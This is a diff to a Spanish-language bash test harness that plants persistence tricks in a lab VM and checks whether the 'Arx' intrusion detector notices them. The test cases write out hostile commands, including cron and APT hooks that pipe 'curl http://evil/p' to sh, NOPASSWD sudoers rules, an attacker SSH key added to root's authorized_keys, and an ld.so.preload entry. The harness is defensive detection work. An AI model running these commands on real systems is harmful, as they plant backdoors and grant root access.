@@ -34,21 +34,23 @@ _since() { local mark="$1" pat="$2"; v sed -n "$((mark+1)),\$p" /var/lib/arx/inc
 # severidad, y anota la fila en la matriz.
 probe() {
   local group="$1" case="$2" variant="$3" pat="$4" plant="$5"
-  local mark t0 hit="" sev="-" lat="-" dt line
+  local mark t0 hit="" sev="-" lat="-" aut="-" dt line
   mark=$(_mark); t0=$(date +%s)
   vb "$plant" >/dev/null 2>&1
   for ((i=0; i<TIMEOUT; i++)); do
     line=$(_since "$mark" "$pat")
     if [ -n "$line" ]; then hit=1; dt=$(( $(date +%s) - t0 )); lat="$dt"
-      sev=$(sed -n 's/.*"sev": *"\([a-z]*\)".*/\1/p' <<<"$line" | head -1); break; fi
+      sev=$(sed -n 's/.*"sev": *"\([a-z]*\)".*/\1/p' <<<"$line" | head -1)
+      # autoría (B77-3): 0.0.9 la pone en el detail con «— by /usr/bin/… (pid…, uid…)»; rc2 no
+      grep -qE "— by /|by /usr/" <<<"$line" && aut="sí" || aut="no"; break; fi
     sleep 1
   done
   if [ -n "$hit" ]; then
-    echo "  [PASS] $group · $case ($variant) → DETECTADO sev=$sev ${lat}s"; PASS=$((PASS+1))
-    MATRIX+=("$group|$case|$variant|DETECTADO|$sev|$lat|")
+    echo "  [PASS] $group · $case ($variant) → DETECTADO sev=$sev ${lat}s autoría=$aut"; PASS=$((PASS+1))
+    MATRIX+=("$group|$case|$variant|DETECTADO|$sev|$lat|$aut")
   else
     echo "  [MISS] $group · $case ($variant) → EVADE (sin incidente en ${TIMEOUT}s)"; MISS=$((MISS+1))
-    MATRIX+=("$group|$case|$variant|EVADE|-|>$TIMEOUT|")
+    MATRIX+=("$group|$case|$variant|EVADE|-|>$TIMEOUT|-")
   fi
 }
 
@@ -61,7 +63,9 @@ vb 'systemctl disable --now arx arx-firewall acme-lib acme-read acme-web acme-ge
   rm -rf /etc/arx /var/lib/arx /tmp/arxsrc /etc/ld.so.preload \
     /etc/systemd/system/acme-*.service /etc/systemd/system/acme-*.service.d \
     /etc/systemd/system/*.service.d/9[01]-arx-*.conf /etc/systemd/system/arx*.service /etc/systemd/system/arx*.timer \
-    /etc/systemd/system/arx-maintenance.slice /etc/systemd/system/*.wants/arx*.service
+    /etc/systemd/system/arx-maintenance.slice /etc/systemd/system/*.wants/arx*.service \
+    /etc/systemd/system/ssh.service.d/99-evil.conf /etc/systemd/system/multi-user.target.wants/cockpit-wants.service
+  rmdir /etc/systemd/system/ssh.service.d 2>/dev/null || true
   grep -lsE "inet:arx:|inet arx confined" /etc/systemd/system.control/*.service.d/*.conf 2>/dev/null | xargs -r rm -f
   rm -f /etc/apt/sources.list.d/zz-arxlab*.list /etc/apt/apt.conf.d/99-arxlab* /etc/apt/trusted.gpg.d/arxlab*.gpg \
     /etc/apt/keyrings/arxlab*.gpg /etc/sudoers.d/zz-arxlab* /etc/.arxlab-hardsrc /etc/cron.d/zz-arxlab* /var/spool/cron/crontabs/root \
@@ -87,7 +91,7 @@ v systemctl is-active -q arx || { echo "  [FAIL] Arx no quedó en guardia"; exit
 echo "  [OK] Arx $(v arx --version 2>/dev/null) en guardia, base sellada"
 
 step "systemd: unidades, drop-ins, socket/path/timer, enlace .wants"
-probe systemd "unidad nueva habilitada" "escritura directa" "systemd_units (changed|appeared)" \
+probe systemd "unidad nueva habilitada" "escritura directa" "systemd_units (changed|appeared)|evil-unit\\.service" \
   'cat > /etc/systemd/system/evil-unit.service <<EOF
 [Unit]
 Description=persistencia
@@ -129,25 +133,25 @@ ln -sf /etc/systemd/system/cockpit-wants.service /etc/systemd/system/multi-user.
 systemctl daemon-reload'
 
 step "APT: repositorios, claves, hooks"
-probe apt_sources "repositorio trusted=yes" "escritura directa" "apt_sources (changed|appeared)" \
+probe apt_sources "repositorio trusted=yes" "escritura directa" "apt_sources (changed|appeared)|zz-arxlab-evil\\.list" \
   'echo "deb [trusted=yes] http://evil.example/ ./" > /etc/apt/sources.list.d/zz-arxlab-evil.list'
-probe apt_keys "clave APT nueva" "escritura directa" "apt_keys (changed|appeared)" \
+probe apt_keys "clave APT nueva" "escritura directa" "apt_keys (changed|appeared)|arxlab-evil\\.gpg" \
   'head -c 64 /dev/urandom > /etc/apt/trusted.gpg.d/arxlab-evil.gpg'
-probe apt_sources "hook DPkg::Post-Invoke" "escritura directa" "apt_sources (changed|appeared)" \
+probe apt_sources "hook DPkg::Post-Invoke" "escritura directa" "apt_sources (changed|appeared)|99-arxlab-hook" \
   'echo "DPkg::Post-Invoke { \"curl -s http://evil/p | sh\"; };" > /etc/apt/apt.conf.d/99-arxlab-hook'
-probe apt_sources "hook APT::Update::Pre-Invoke" "escritura directa" "apt_sources (changed|appeared)" \
+probe apt_sources "hook APT::Update::Pre-Invoke" "escritura directa" "apt_sources (changed|appeared)|99-arxlab-upd" \
   'echo "APT::Update::Pre-Invoke { \"/tmp/evil\"; };" > /etc/apt/apt.conf.d/99-arxlab-upd'
 
 step "cron, sudoers, authorized_keys, ld.so.preload"
-probe cron "cron.d nuevo" "escritura directa" "cron (changed|appeared)" \
+probe cron "cron.d nuevo" "escritura directa" "cron (changed|appeared)|zz-arxlab-evil" \
   'echo "* * * * * root /usr/bin/curl -s http://evil/p | sh" > /etc/cron.d/zz-arxlab-evil'
-probe cron "crontab de usuario (root)" "escritura directa" "cron (changed|appeared)" \
+probe cron "crontab de usuario (root)" "escritura directa" "cron (changed|appeared)|crontabs/root" \
   'mkdir -p /var/spool/cron/crontabs; echo "* * * * * /tmp/evil" > /var/spool/cron/crontabs/root; chmod 600 /var/spool/cron/crontabs/root'
-probe sudoers_d "sudoers.d NOPASSWD" "escritura directa" "sudoers_d (changed|appeared)|sudoers (changed|appeared)" \
+probe sudoers_d "sudoers.d NOPASSWD" "escritura directa" "sudoers_d (changed|appeared)|sudoers (changed|appeared)|zz-arxlab-evil" \
   'echo "nobody ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/zz-arxlab-evil; chmod 440 /etc/sudoers.d/zz-arxlab-evil'
-probe authorized_keys_root "clave en authorized_keys de root" "escritura directa" "authorized_keys_root (changed|appeared)" \
+probe authorized_keys_root "clave en authorized_keys de root" "escritura directa" "authorized_keys_root (changed|appeared)|/root/\\.ssh/authorized_keys" \
   'mkdir -p /root/.ssh; echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl atacante" >> /root/.ssh/authorized_keys'
-probe ld_preload "ld.so.preload nuevo" "escritura directa" "ld_preload (changed|appeared)" \
+probe ld_preload "ld.so.preload nuevo" "escritura directa" "ld_preload (changed|appeared)|ld\\.so\\.preload" \
   'echo "/tmp/evil.so" > /etc/ld.so.preload'
 
 step "variantes de escritura sobre un objetivo vigilado (sudoers.d/zz-arxlab-var)"
@@ -156,25 +160,25 @@ step "variantes de escritura sobre un objetivo vigilado (sudoers.d/zz-arxlab-var
 _reset_var() { vb 'rm -f /etc/sudoers.d/zz-arxlab-var /tmp/arxlab-src; echo "# base" > /etc/sudoers.d/zz-arxlab-var; chmod 440 /etc/sudoers.d/zz-arxlab-var'; arx_accept_all; }
 arx_accept_all() { vb 'for f in $(arx accept 2>/dev/null | sed -n "s/^  \([0-9a-f]\{6,\}\) .*/\1/p"); do arx accept "$f" >/dev/null 2>&1; done' >/dev/null 2>&1; }
 _reset_var
-probe sudoers_d "regla NOPASSWD" "sed -i" "sudoers_d (changed|appeared)" \
+probe sudoers_d "regla NOPASSWD" "sed -i" "sudoers_d (changed|appeared)|zz-arxlab-var|zz-arxlab-hard" \
   'sed -i "1a nobody ALL=(ALL) NOPASSWD: ALL" /etc/sudoers.d/zz-arxlab-var'
 _reset_var
-probe sudoers_d "regla NOPASSWD" "renombrar encima" "sudoers_d (changed|appeared)" \
+probe sudoers_d "regla NOPASSWD" "renombrar encima" "sudoers_d (changed|appeared)|zz-arxlab-var|zz-arxlab-hard" \
   'printf "# base\nnobody ALL=(ALL) NOPASSWD: ALL\n" > /tmp/arxlab-src; chmod 440 /tmp/arxlab-src; mv -f /tmp/arxlab-src /etc/sudoers.d/zz-arxlab-var'
 _reset_var
-probe sudoers_d "fichero nuevo por enlace duro" "enlace duro" "sudoers_d (changed|appeared)" \
+probe sudoers_d "fichero nuevo por enlace duro" "enlace duro" "sudoers_d (changed|appeared)|zz-arxlab-var|zz-arxlab-hard" \
   'printf "nobody ALL=(ALL) NOPASSWD: ALL\n" > /etc/.arxlab-hardsrc; chmod 440 /etc/.arxlab-hardsrc; ln /etc/.arxlab-hardsrc /etc/sudoers.d/zz-arxlab-hard'
 _reset_var
-probe sudoers_d "regla NOPASSWD" "cp" "sudoers_d (changed|appeared)" \
+probe sudoers_d "regla NOPASSWD" "cp" "sudoers_d (changed|appeared)|zz-arxlab-var|zz-arxlab-hard" \
   'printf "# base\nnobody ALL=(ALL) NOPASSWD: ALL\n" > /tmp/arxlab-src; cp -f /tmp/arxlab-src /etc/sudoers.d/zz-arxlab-var; chmod 440 /etc/sudoers.d/zz-arxlab-var'
 _reset_var
-probe sudoers_d "regla NOPASSWD" "install" "sudoers_d (changed|appeared)" \
+probe sudoers_d "regla NOPASSWD" "install" "sudoers_d (changed|appeared)|zz-arxlab-var|zz-arxlab-hard" \
   'printf "# base\nnobody ALL=(ALL) NOPASSWD: ALL\n" > /tmp/arxlab-src; install -m 440 /tmp/arxlab-src /etc/sudoers.d/zz-arxlab-var'
 _reset_var
-probe sudoers_d "regla NOPASSWD" "tee" "sudoers_d (changed|appeared)" \
+probe sudoers_d "regla NOPASSWD" "tee" "sudoers_d (changed|appeared)|zz-arxlab-var|zz-arxlab-hard" \
   'printf "# base\nnobody ALL=(ALL) NOPASSWD: ALL\n" | tee /etc/sudoers.d/zz-arxlab-var >/dev/null; chmod 440 /etc/sudoers.d/zz-arxlab-var'
 _reset_var
-probe sudoers_d "solo permisos (chmod a 777)" "solo permisos" "sudoers_d (changed|appeared)" \
+probe sudoers_d "solo permisos (chmod a 777)" "solo permisos" "sudoers_d (changed|appeared)|zz-arxlab-var|zz-arxlab-hard" \
   'chmod 777 /etc/sudoers.d/zz-arxlab-var'
 
 step "RESUMEN"
@@ -182,19 +186,19 @@ echo "  DETECTADOS: $PASS   ·   EVADEN: $MISS   ·   total: $((PASS+MISS))"
 echo "  (EVADE no es fallo del lab: fija lo que B77 debe cerrar)"
 
 # ── volcado de la matriz a la evidencia ──
-OUT="DevelopDocs/pistas/q/r2-linea-base-rc2.md"
+OUT="${ARX_R2_OUT:-DevelopDocs/pistas/q/r2-linea-base-rc2.md}"
 mkdir -p "$(dirname "$OUT")"
 {
-  echo "# Pista Q · Línea base R2: qué detecta rc2 (plan maestro §2)"
+  echo "# ${ARX_R2_TITLE:-Pista Q · Línea base R2: qué detecta rc2 (plan maestro §2)}"
   echo
-  echo "- VM: \`$VM\` (Debian 13, aarch64).  Arx: \`$(limactl shell "$VM" sudo arx --version 2>/dev/null | tr -d '\r')\` (fuente de la rama; integridad == rc2: hash por grupo, cfgsem aún no cableado al guardián)."
+  echo "- VM: \`$VM\` (Debian 13, aarch64).  Arx: \`$(limactl shell "$VM" sudo arx --version 2>/dev/null | tr -d '\r')\` · commit \`$(git rev-parse --short HEAD 2>/dev/null)\`.  ${ARX_R2_NOTE:-Integridad == rc2: hash por grupo, cfgsem aún no cableado al guardián.}"
   echo "- Fecha: $(date +%F).  TIMEOUT por caso: ${TIMEOUT}s.  DETECTADO=incidente nuevo que lo nombra; EVADE=sin incidente."
   echo "- EVADE marca el objetivo de B77 (integridad semántica por fichero + drop-ins/socket/path/.wants + autoría)."
   echo
-  echo "| Grupo | Caso | Variante | Resultado | Sev | Latencia |"
-  echo "|---|---|---|---|---|---|"
-  for row in "${MATRIX[@]}"; do IFS='|' read -r g c var res sev lat _ <<<"$row"
-    echo "| $g | $c | $var | **$res** | $sev | ${lat}s |"; done
+  echo "| Grupo | Caso | Variante | Resultado | Sev | Latencia | Autoría |"
+  echo "|---|---|---|---|---|---|---|"
+  for row in "${MATRIX[@]}"; do IFS='|' read -r g c var res sev lat aut <<<"$row"
+    echo "| $g | $c | $var | **$res** | $sev | ${lat}s | $aut |"; done
   echo
   echo "Resumen: DETECTADOS=$PASS · EVADEN=$MISS · total=$((PASS+MISS))."
 } > "$OUT"
